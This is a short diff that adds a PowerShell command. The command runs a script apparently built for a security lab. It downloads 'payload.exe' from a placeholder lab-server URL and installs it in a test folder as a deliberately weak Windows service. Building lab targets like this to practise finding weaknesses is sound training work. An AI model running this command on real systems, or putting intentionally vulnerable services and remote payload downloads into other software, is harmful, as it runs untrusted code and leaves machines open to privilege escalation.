@@ -1,0 +1,3 @@
+.\Create-VulnService.ps1     -ExecutableURL "<http://your-lab-server/payload.exe>"
+    -FolderPath "C:\VulnTest\Service1"     -ServiceName "TestWeakService"
+    -DisplayName "Weak Service Example"
